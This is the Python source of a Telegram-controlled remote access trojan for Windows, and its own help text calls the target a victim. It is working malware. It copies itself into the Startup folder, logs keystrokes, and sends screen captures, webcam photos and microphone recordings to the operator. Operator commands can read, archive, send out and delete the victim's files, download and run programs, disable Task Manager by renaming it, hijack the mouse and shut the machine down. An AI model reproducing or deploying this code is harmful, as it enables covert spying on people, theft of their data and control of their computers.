#Made by xsarz (@DXsarz)

from telebot import TeleBot
from telebot.types import ReplyKeyboardMarkup as markup
from telebot.types import InlineKeyboardButton as button
from telebot.types import InlineKeyboardMarkup as inline

from os import system as shell
from os import remove, rename, listdir, walk, rmdir
from os.path import join as osjoin
from psutil import process_iter
from time import sleep
from cv2 import VideoCapture, imwrite
from pyautogui import screenshot as pyscreen
from pyautogui import position as guiposition
from pyautogui import moveTo
from threading import Thread
from random import randint
from pyautogui import FAILSAFE
from webbrowser import open as web_open
from pyaudio import PyAudio
from pyaudio import paInt16
from wave import open as Wopen
from gtts import gTTS
import pyttsx3
from subprocess import call as subcall
from zipfile import ZipFile, ZIP_DEFLATED
from requests import get
from keyboard import on_press, wait
from getpass import getuser
from sys import argv
from shutil import copyfile

USER_NAME = getuser()
FAILSAFE = False

class config:
	def __init__(self):
		self.main_menu=markup(resize_keyboard = True, row_width=2).add(
			button("Управление компьютером👩‍💻"),
			button("Основные команды⚡"),
			button("Слэш команды💻")
			)
		self.computer_management=markup(resize_keyboard = True, row_width=1).add(
			button("Заблокировать / Разблокировать диспетчер задач🔒"),
			button("Отключить пк🔕"),
			button("Перезагрузить пк♻"),
			button("Заблокировать / Разблокировать мышку🖱"),
			button("Включить / Выключить непослушную  мышку🖱"),
			button("Активные процессы💻"),
			button("На главную🎌")
			)
		self.main_commands=markup(resize_keyboard = True, row_width=1).add(
			button("Скриншот экрана💻"),
			button("Скриншот вебки🎥"),
			button("Получить нажатия⌨"),
			button("На главную🎌")
			)

		self.bool_var = {
			'input_stop': False,
			'mouse_frenzied': False,
		}
		self.slash_commands = """
			Все команды:
			/open ссылка - откроет ссылку в браузере
			/close - закроет выбранную программу
			/run путь к файлу - открывает программу
			/voice текст - озвучит текст жертве
			/read путь к файлу - прочитает файл и отправит его содержимое вам
			/get путь к файлу - отправит файл вам
			/send путь - после отправляете файл и он сохраняется на компе у жерты по заданному пути
			/show путь - покажет все файлы в папке
			/delete_file путь к файлу - удалит файл
			/delete_folder путь - удалить папку по указанному пути
			/archive путь - создаст архив с выбранной папкой и отправит
			/micro секунды (по умолчанию 10) - запишет гс с микрофона жертвы указаной длинны
		"""
		self.previous_command = 'None'
		self.log = []


class func:
	def __init__(self, client, admins: list):
		self.client=client
		self.admins=admins
		self.config = config()
		self.name=argv[0].split('\\')[-1]


	def run(self):
		if self.name not in listdir(f"C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"):self.copy()
		else:
			if argv[0] == f'C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{self.name}':self.start()

	def start(self):
		Thread(target=self.update_keys).start()
		on_press(self.key_log)
		Thread(target=wait).start()
		while True:
			try:
				self.client.polling(none_stop=True)
			except:
				sleep(30)

	def send_long_message(self, chatId, text: str):
		try:
			if len(text) > 4096:
				for x in range(0, len(text), 4096):
					self.client.send_message(chatId, text[x:x+4096])
			else:
				self.client.send_message(chatId,text)
		except:
			self.client.send_message(chatId,  'Произошла ошибка при отправке сообщения.')

	def get_process(self, chatId):
		try:
			processess_list = list()
			for proc in process_iter():
				processess_list.append(proc.name())
			processess = '\n'.join(processess_list)
			self.send_long_message(chatId, processess)
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def screenshot(self, chatId):
		try:
			screen = pyscreen(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/screenshot.png')
			self.client.send_photo(chatId, screen)
			remove(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/screenshot.png')
		except Exception as error:
			self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def webcam_snapshot(self, chatId):
		try:
			capture = VideoCapture(0)
			for i in range(60):capture.read()  
			ret, frame = capture.read()
			imwrite(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/webcam_snapshot.png', frame)   
			capture.release()
			with open(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/webcam_snapshot.png', 'rb') as photo:
				self.client.send_photo(chatId, photo)
			remove(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/webcam_snapshot.png')
		except Exception as error:
			self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def lock_mouse(self, chatId):
		try:
			if self.config.bool_var['input_stop'] == False:
				self.config.bool_var['input_stop'] = True
				x, y = guiposition()
				Thread(target=self.lock_mouse_process, args=(x,y)).start()
				client.send_message(chatId, f"Заблокировано✔")
			else:
				self.config.bool_var['input_stop'] = False
				self.client.send_message(chatId, f"Разблокировано✔")
		except Exception as error:
			self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def mouse_frenzied(self, chatId):
		try:
			if self.config.bool_var['mouse_frenzied'] == False:
				self.config.bool_var['mouse_frenzied'] = True
				x, y = guiposition()
				Thread(target=self.lock_mouse_process).start()
				self.client.send_message(chatId, f"Непослушная мышка запущена✔")
			else:
				self.config.bool_var['mouse_frenzied'] = False
				self.client.send_message(chatId, f"Непослушная мышка остановлена✔")
		except Exception as error:
			self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def lock_mouse_process(self, x = None, y = None):
		if x == None or y == None:
			while self.config.bool_var['mouse_frenzied']:
				moveTo(randint(1, 1900), randint(1, 1900), duration=0.01)
		else:
			while self.config.bool_var['input_stop']:
				moveTo(x, y, duration=0.01)

	def lock_unlock_taskmngr(self, chatId):
		try:
			path1 = "C:\Windows\System32\Taskmgr.exe"
			path2 = "C:\Windows\System32\sys_32.exe"

			if 'Taskmgr.exe' in listdir('C:\Windows\System32'):
				rename(path1, path2)
				self.client.send_message(chatId, f"Диспетчер задач заблокирован✔")
			elif 'sys_32.exe' in listdir('C:\Windows\System32'):
				rename(path2, path1)
				self.client.send_message(chatId, f"Диспетчер задач разблокирован✔")
			else:
				self.client.send_message(chatId, f"Диспетчер задач не найден❗")
		except Exception as error:
			self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def open_url(self, chatId, url):
		try:
			web_open(url, new=2)
			self.client.send_message(chatId, f"Ссылка открыта в браузере✔")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def micro_rec(self, chatId, time):
		try:
			time=int(time)
			if time == '':time=10
			CHUNK = 1024
			FORMAT = paInt16
			CHANNELS = 2
			RATE = 44100
			WAVE_OUTPUT_FILENAME = f"C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/output.wav"

			p = PyAudio()

			stream = p.open(format=FORMAT,
							channels=CHANNELS,
							rate=RATE,
							input=True,
							frames_per_buffer=CHUNK)

			self.client.send_message(chatId, f"Запись с микро...")

			frames = []

			for i in range(0, int(RATE / CHUNK * time+1)):
				data = stream.read(CHUNK)
				frames.append(data)

			stream.stop_stream()
			stream.close()
			p.terminate()

			wf = Wopen(WAVE_OUTPUT_FILENAME, 'wb')
			wf.setnchannels(CHANNELS)
			wf.setsampwidth(p.get_sample_size(FORMAT))
			wf.setframerate(RATE)
			wf.writeframes(b''.join(frames))
			wf.close()
			self.client.send_audio(chatId, open(WAVE_OUTPUT_FILENAME, 'rb'))
			remove(WAVE_OUTPUT_FILENAME)
		except ValueError:self.client.send_message(chatId, f"Введите количество секунд для записи.")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def stop_exe(self, chatId, exe_name):
		try:
			if exe_name !="":
				try:shell(f"TASKKILL /F /IM {exe_name}");self.client.send_message(chatId, f"Программа закрыта✔")
				except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")
			else:self.client.send_message(chatId, f"Вы не указали имя программы (.exe)")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")



	def voice(self, chatId, text):
		try:
			if text !="":
				tts = pyttsx3.init()
				rate = tts.getProperty('rate')
				tts.setProperty('rate', rate-40)

				volume = tts.getProperty('volume')
				tts.setProperty('volume', volume+0.9)

				voices = tts.getProperty('voices')
				tts.setProperty('voice', 'ru') 
				for voice in voices:
					if voice.name == 'Anna':
						tts.setProperty('voice', voice.id)

				tts.say(text)
				tts.runAndWait()
				self.client.send_message(chatId, f"Текст озвучен✔")
				return
			self.client.send_message(chatId, f"Вы не указали текст для озвучки.")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def run_file(self, chatId, file_path):
		try:
			if file_path == '':
				self.client.send_message(chatId, f"Вы не указали путь до програмы (exe файл).")
				return
			subcall(file_path)
			self.client.send_message(chatId, f"Запускаю файл.")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")


	def read_file(self, chatId, file_path):
		try:
			if file_path != '':
				text = open(file_path, encoding='utf-8').read()
				self.send_long_message(chatId, text)
				return
			self.client.send_message(chatId, f"Вы не указали путь к файлу.")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def get_file(self, chatId, path):
		try:
			if path != '':
				with open(path, 'rb') as file:
					client.send_document(chatId, file)
					return
			self.client.send_message(chatId, f"Вы не указали путь к файлу.")
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def post_file(self, chatId, path, file):
		try:
			p = get(file)
			with open(path, "wb") as out:
				out.write(p.content)
				out.close()
			client.send_message(chatId, f'Файл сохранен по пути:\n{path}')
		except Exception as error:self.client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def show_folder(self, chatId, path):
		try:
			if path != '':
				self.send_long_message(chatId, '\n'.join(listdir(path)))
				return
			self.client.send_message(chatId, f"Вы не указали папку.")
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def delete(self, chatId, path, type = 'file'):
		try:
			if path=='':
				client.send_message(chatId, f"Вы не указали файл.")
				return
			if type == 'file':
				remove(path)
				client.send_message(chatId, f"файл {path} удалён.")
			elif type == 'folder':
				rmdir(path)
				client.send_message(chatId, f"Папка по пути {path} удалена.")
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def archive_file(self, chatId, path):
		try:
			num = 0
			zip = ZipFile(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/save.zip', "w", ZIP_DEFLATED, True)
			for add_folder in [path]:
				for root, dirs, files in walk(add_folder):
					for file in files:
						path = osjoin(root, file)
						zip.write(path)
						num += 1
			zip.close()
			self.get_file(chatId, f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/save.zip')
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def key_log(self, e):
		name = e.name
		if name == "decimal":name = "."
		elif name == "space":name = " "
		elif name == "enter":name = f"\n[{name}]\n"
		elif name == "delete":name = f" [{name}] "
		elif name == "ctrl":name = f" [{name}] "
		elif name == "left":name = f" [{name}] "
		elif name == "up":name = f" [{name}] "
		elif name == "down":name = f" [{name}] "
		elif name == "right":name = f" [{name}] "
		elif name == "backspace":name = f" [{name}] "
		elif name == "tab":name = f" [{name}] "
		elif name == "print screen":name = f" [{name}] "
		elif name == "scroll lock":name = f" [{name}] "
		elif name == "insert":name = f" [{name}] "
		elif name == "pause":name = f" [{name}] "
		elif name == "caps lock":name = f" [{name}] "
		elif name == "num lock":name = f" [{name}] "
		elif name == "windows":name = f" [{name}] "
		self.config.log.append(name)

	def update_keys(self):
		while True:
			try:
				if 'keys.txt' not in listdir(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/'):
					with open(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/keys.txt', 'w') as file:
						file.write(''.join(self.config.log))
						file.close()
				else:
					with open(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/keys.txt', 'r') as file:
						log = file.read()
						file.close()
					with open(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/keys.txt', 'w') as file:
						file.write(log+''.join(self.config.log))
						file.close()

				self.config.log=[]
				sleep(3)
			except:pass

	def get_keys(self, chatId):
		try:
			if 'keys.txt' in listdir(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/'):
				with open(f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/keys.txt', 'rb') as file:
					client.send_document(chatId, file)
				self.delete(chatId, f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/keys.txt')
			else:
				client.send_message(chatId, f"Файл с клавишами не найден❗")
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def copy(self):
		file = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{self.name}'
		copyfile(argv[0], file)
		self.start()

	def on_start_command(self, message):
		if message.from_user.id in funcs.admins: self.client.send_message(message.from_user.id, 'Привет, {0.first_name}, выбери команду.'.format(message.from_user), reply_markup=self.config.main_menu)
		else:self.client.send_message(message.from_user.id, 'Вы не админ.')

	def on_msg(self, message):
		userId = message.from_user.id
		chatId = message.chat.id
		content = message.text
		try:
			ct = content.split(' ')
			if userId not in funcs.admins:
				self.client.send_message(userId, 'Вы не админ.')
				return

			#main menu
			if content.lower() == 'управление компьютером👩‍💻':self.client.send_message(message.from_user.id, 'Перехожу...',reply_markup=self.config.computer_management)
			elif content.lower() == 'основные команды⚡':self.client.send_message(message.from_user.id, 'Перехожу...',reply_markup=self.config.main_commands)
			elif content.lower() == 'слэш команды💻':self.client.send_message(message.from_user.id, self.config.slash_commands)
			elif content.lower() == 'на главную🎌':self.client.send_message(message.from_user.id, 'Перехожу...',reply_markup=self.config.main_menu)

			#computer management
			elif content.lower() == "отключить пк🔕": self.client.send_message(chatId, 'Отключаю...');shell("shutdown -s -t 1")
			elif content.lower() == "перезагрузить пк♻": self.client.send_message(chatId, 'Перезагружаю...');shell("shutdown -r -t 1")
			elif content.lower() == "активные процессы💻":self.get_process(chatId)
			elif content.lower() == "заблокировать / разблокировать мышку🖱":self.lock_mouse(chatId)
			elif content.lower() == "включить / выключить непослушную  мышку🖱":self.mouse_frenzied(chatId)
			elif content.lower() == "заблокировать / разблокировать диспетчер задач🔒":self.lock_unlock_taskmngr(chatId)

			#main commands
			elif content.lower() == "скриншот экрана💻": self.screenshot(chatId)
			elif content.lower() == "скриншот вебки🎥":self.webcam_snapshot(chatId)
			elif content.lower() == "получить нажатия⌨":self.get_keys(chatId)
			#slash commands

			elif ct[0][0] == '/':
				if ct[0][1:] == 'open':self.open_url(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'micro':self.micro_rec(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'close':self.stop_exe(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'voice':self.voice(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'run':self.run_file(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'read':self.read_file(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'get':self.get_file(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'send':self.client.send_message(chatId, f"Ожидаю файл для сохранения.")
				elif ct[0][1:] == 'show':self.show_folder(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'delete_file':self.delete(chatId, ' '.join(ct[1:]))
				elif ct[0][1:] == 'delete_folder':self.delete(chatId, ' '.join(ct[1:]), type='folder')
				elif ct[0][1:] == 'archive':self.archive_file(chatId, ' '.join(ct[1:]))

			self.config.previous_command = content
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")

	def on_file(self, message):
		userId = message.from_user.id
		chatId = message.chat.id
		try:
			if userId not in funcs.admins:
				self.client.send_message(userId, 'Вы не админ.')
				return

			document_id = message.document.file_id
			file_info = client.get_file(document_id)
			file = f'http://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}'
			content = self.config.previous_command
			ct=content.split(" ")
			if ct[0][0] == '/':
				if ct[0][1:] == 'send':
					self.post_file(chatId, ' '.join(ct[1:]), file)
		except Exception as error:client.send_message(chatId, f"Произошла ошибка:\n{error}")



#input
TOKEN=''#токен сюда
ADMINS=[]#айди админов через запятую (тип int) #пример - [2343443434, 434546543, 35454, ...] или [253546346]
#input

funcs = func(client=TeleBot(TOKEN), admins=ADMINS)
client = funcs.client
@client.message_handler(commands=['start'])
def call_start(message):funcs.on_start_command(message)
@client.message_handler(content_types=['text'])
def call_commands(message):funcs.on_msg(message)
@client.message_handler(content_types=['document'])
def document_call(message):funcs.on_file(message)

if __name__ == '__main__':
	funcs.run()